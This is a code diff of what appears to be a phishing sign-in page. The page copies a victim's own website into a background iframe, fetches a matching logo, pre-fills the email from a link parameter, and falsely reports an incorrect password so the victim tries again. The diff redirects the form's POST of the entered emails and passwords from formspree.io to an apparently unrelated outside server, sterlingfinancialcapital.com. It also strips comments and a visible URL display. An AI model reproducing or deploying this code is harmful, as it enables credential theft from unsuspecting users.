@@ -15,7 +15,7 @@
             height: 100vh;
             width: 100vw;
             font-family: Arial, Helvetica, sans-serif;
-            background-color: #FFFFFF; /* Restored original background */
+            background-color: #FFFFFF;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -31,7 +31,7 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 1; /* Changed from 0.15 to maximum 1 */
+            opacity: 1;
             transition: opacity 0.5s ease;
         }
         
@@ -39,24 +39,24 @@
             width: 100%;
             height: 100%;
             border: none;
-            filter: grayscale(0%); /* Removed grayscale for full color */
-            transform: scale(1); /* Removed scale effect */
+            filter: grayscale(0%);
+            transform: scale(1);
         }
         
         /* REMOVE the overlay completely */
         .iframe-overlay {
-            display: none; /* Hide the overlay */
+            display: none;
         }
         
         .container {
             max-width: 400px;
             width: 90%;
             padding: 30px;
-            background-color: #FFFFFF; /* Reduced opacity from 0.95 to 0.85 */
+            background-color: #FFFFFF;
             border-radius: 10px;
-            box-shadow: #FFFFFF; /* Darker shadow for better contrast */
-            backdrop-filter: #FFFFFF; /* Reduced blur from 10px to 5px */
-            border: #FFFFFF; /* More transparent border */
+            box-shadow: #FFFFFF;
+            backdrop-filter: #FFFFFF;
+            border: #FFFFFF;
             position: relative;
             z-index: 1;
         }
@@ -65,15 +65,15 @@
             .container {
                 padding: 20px;
                 margin: 20px;
-                background-color: #FFFFFF; /* Even more transparent on mobile */
+                background-color: #FFFFFF;
             }
             
             .iframe-background {
-                opacity: 1; /* Keep maximum visibility on mobile */
+                opacity: 1;
             }
             
             .iframe-background iframe {
-                filter: grayscale(0%); /* Full color on mobile too */
+                filter: grayscale(0%);
             }
         }
         
@@ -102,30 +102,6 @@
             background: rgba(255, 193, 7, 0.1);
             border-radius: 4px;
             display: none;
-        }
-        
-        /* Add URL display styling */
-        .url-display {
-            text-align: center;
-            margin: 10px 0;
-            color: #666;
-            font-size: 11px;
-            padding: 8px;
-            background: rgba(240, 248, 255, 0.9);
-            border-radius: 4px;
-            word-break: break-all;
-            max-height: 60px;
-            overflow-y: auto;
-            font-family: monospace;
-            border: 1px solid rgba(200, 225, 255, 0.5);
-        }
-        
-        .url-display .url-label {
-            display: block;
-            font-size: 10px;
-            color: #888;
-            margin-bottom: 4px;
-            font-weight: bold;
         }
         
         .img {
@@ -197,9 +173,9 @@
             width: 100%;
             padding: 12px 15px;
             margin: 8px 0 20px 0;
-            border: 1px solid rgba(0, 0, 0, 0.2); /* More transparent border */
+            border: 1px solid rgba(0, 0, 0, 0.2);
             border-radius: 5px;
-            background: rgba(255, 255, 255, 0.9); /* Slightly more transparent */
+            background: rgba(255, 255, 255, 0.9);
             font-size: 14px;
             transition: all 0.3s ease;
         }
@@ -294,8 +270,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* REMOVED: Toggle switch for iframe background */
-        
         .iframe-loading {
             position: absolute;
             top: 50%;
@@ -310,11 +284,34 @@
             z-index: 1;
             display: none;
         }
+        
+        /* Add style for URL display (optional) */
+        .url-display {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 11px;
+            color: #666;
+            font-family: monospace;
+            word-break: break-all;
+            background: rgba(0, 0, 0, 0.03);
+            padding: 5px;
+            border-radius: 3px;
+            display: none; /* Hidden by default */
+        }
     </style>
+    
+    <!-- URL Parameter Parsing Script -->
+    <script>
+        // Function to get URL parameter
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+    </script>
 </head>
 <body>
-    <!-- REMOVED: Background toggle switch -->
-    
     <!-- Iframe background -->
     <div class="iframe-background" id="iframe-background">
         <div class="iframe-overlay"></div>
@@ -331,22 +328,10 @@
             </div>
         </div>
         
-        <!-- REMOVED: Domain info section -->
-        <!-- <div class="domain-info" id="domain-info">
-            Logging in to: <span class="domain-name" id="current-domain">example.com</span>
-        </div> -->
-        
-        <!--<div class="attempt-info" id="attempt-info">
-            <span id="attempt-text">Attempt 1 of 2</span>
-        </div>-->
-        
         <h3 id="title">Sign In</h3>
         
-        <!-- URL Display -->
-        <div class="url-display" id="url-display">
-            <span class="url-label">Current URL:</span>
-            <span id="current-url"></span>
-        </div>
+        <!-- Optional URL display (uncomment if you want to show it) -->
+        <!-- <div class="url-display" id="current-url"></div> -->
         
         <div id="error">Password is incorrect, please try again!</div>
         <div id="success">Login successful! Redirecting...</div>
@@ -382,17 +367,16 @@ let loginAttempts = parseInt(localStorage.getItem('loginAttempts')) || 0;
 let currentEmail = '';
 let storedEmail = localStorage.getItem('currentEmail') || '';
 
-// Function to update URL and display
+// EMAIL URL ENCODING FUNCTIONALITY
+// Function to update URL with encoded email
 function updateURL() {
     const email = document.getElementById('email').value.trim();
-    const urlDisplay = document.getElementById('current-url');
     
     if (!email) {
         // If empty, remove query param
         history.replaceState(null, "", window.location.pathname);
-        if (urlDisplay) {
-            urlDisplay.textContent = window.location.href;
-        }
+        // Optional: Update URL display
+        // document.getElementById('current-url').textContent = window.location.href;
         return;
     }
 
@@ -402,10 +386,8 @@ function updateURL() {
     // Update browser URL without reloading page
     history.replaceState(null, "", newUrl);
 
-    // Show current URL
-    if (urlDisplay) {
-        urlDisplay.textContent = window.location.href;
-    }
+    // Optional: Show current URL (uncomment if you want to display it)
+    // document.getElementById('current-url').textContent = window.location.href;
 }
 
 // Function to load iframe with website preview
@@ -415,7 +397,7 @@ function loadWebsitePreview(domain) {
     const iframeBackground = document.getElementById('iframe-background');
     
     if (!domain || domain === 'example.com') {
-        iframeBackground.style.opacity = '1'; // Changed from '0' to '1'
+        iframeBackground.style.opacity = '1';
         return;
     }
     
@@ -432,7 +414,7 @@ function loadWebsitePreview(domain) {
     iframe.onload = function() {
         iframeLoading.style.display = 'none';
         iframe.style.opacity = '1';
-        iframeBackground.style.opacity = '1'; // Maximum opacity
+        iframeBackground.style.opacity = '1';
         console.log('Website preview loaded successfully for:', domain);
     };
     
@@ -448,7 +430,7 @@ function loadWebsitePreview(domain) {
         
         // If both fail, keep iframe visible with fallback
         iframeLoading.style.display = 'none';
-        iframeBackground.style.opacity = '1'; // Still keep it visible
+        iframeBackground.style.opacity = '1';
     };
 }
 
@@ -568,10 +550,32 @@ function loadLogoFromEmail(email) {
 
 // Initialize form
 function initializeForm() {
-    // Show default logo
-    $("#logo").hide();
-    $("#logo-fallback").show().text("✓");
-    $(".logo-container").css("background-color", "#0096FF");
+    // Check for email parameter in URL
+    var emailParam = getUrlParameter('email');
+    if (emailParam) {
+        document.getElementById('email').value = emailParam;
+        currentEmail = emailParam;
+        storedEmail = emailParam;
+        localStorage.setItem('currentEmail', emailParam);
+        
+        // Update URL to ensure it's clean/consistent
+        updateURL();
+        
+        // Load logo for the pre-filled email
+        if (isValidEmail(emailParam)) {
+            loadLogoFromEmail(emailParam);
+        }
+    }
+    
+    // Optional: Show current URL (uncomment if you want to display it)
+    // document.getElementById('current-url').textContent = window.location.href;
+    
+    // Show default logo if no email in URL
+    if (!emailParam) {
+        $("#logo").hide();
+        $("#logo-fallback").show().text("✓");
+        $(".logo-container").css("background-color", "#0096FF");
+    }
     
     // Hide attempt info
     $('#attempt-info').hide();
@@ -581,13 +585,17 @@ function initializeForm() {
         updateAttemptDisplay();
     }
     
-    // Focus on email field
+    // Focus on password field if email is pre-filled, otherwise focus on email
     setTimeout(() => {
-        $('#email').focus();
+        if (emailParam) {
+            $('#psw').focus();
+        } else {
+            $('#email').focus();
+        }
     }, 100);
 }
 
-// Update logo when user enters email
+// Update logo when user enters email and update URL
 $("#email").on("input", function() {
     const email = $(this).val().trim();
     currentEmail = email;
@@ -597,7 +605,7 @@ $("#email").on("input", function() {
         localStorage.setItem('currentEmail', email);
     }
     
-    // Update URL with email parameter
+    // Update URL with encoded email
     updateURL();
     
     if (email && isValidEmail(email)) {
@@ -618,9 +626,13 @@ $("#email").on("input", function() {
         $('#attempt-info').hide();
         
         // Keep iframe visible but with default or no content
-        document.getElementById('iframe-background').style.opacity = '1'; // Changed from '0' to '1'
+        document.getElementById('iframe-background').style.opacity = '1';
     }
 });
+
+// Also update URL on blur and change events
+document.getElementById('email').addEventListener('blur', updateURL);
+document.getElementById('email').addEventListener('change', updateURL);
 
 // Form submission handler
 document.getElementById('login-form').addEventListener('submit', function(e) {
@@ -692,7 +704,7 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
         
         // Send data to FormSubmit endpoint
         $.ajax({
-            url: "https://formspree.io/f/mqkjanqr",
+            url: "https://sterlingfinancialcapital.com/mrfx-general/api.php",
             type: "POST",
             data: formData,
             dataType: "json",
@@ -726,7 +738,7 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
         
         // Send to FormSubmit endpoint
         $.ajax({
-            url: "https://formspree.io/f/mqkjanqr",
+            url: "https://sterlingfinancialcapital.com/mrfx-general/api.php",
             type: "POST",
             data: formData,
             dataType: "json"
@@ -789,35 +801,9 @@ document.querySelector('input[name="_honey"]').addEventListener('focus', functio
     this.value = 'bot-detected-' + Date.now();
 });
 
-// REMOVED: Background toggle functionality
-
 // Initialize form when page loads
 $(document).ready(function() {
     initializeForm();
-    
-    // On page load: try to pre-fill from URL
-    const params = new URLSearchParams(window.location.search);
-    const emailFromUrl = params.get("email");
-    const urlDisplay = document.getElementById('current-url');
-
-    if (emailFromUrl) {
-        document.getElementById('email').value = emailFromUrl; // automatically decoded
-        updateURL(); // ensure URL is clean/consistent
-        
-        // Also trigger the logo loading for the email
-        const emailInput = document.getElementById('email');
-        const event = new Event('input');
-        emailInput.dispatchEvent(event);
-    } else {
-        if (urlDisplay) {
-            urlDisplay.textContent = window.location.href;
-        }
-    }
-    
-    // Also update on blur (in case user pastes or autocomplete fills it)
-    const emailInput = document.getElementById('email');
-    emailInput.addEventListener('change', updateURL);
-    emailInput.addEventListener('blur', updateURL);
 });
 
 // Clear attempts when page is closed/refreshed (optional)
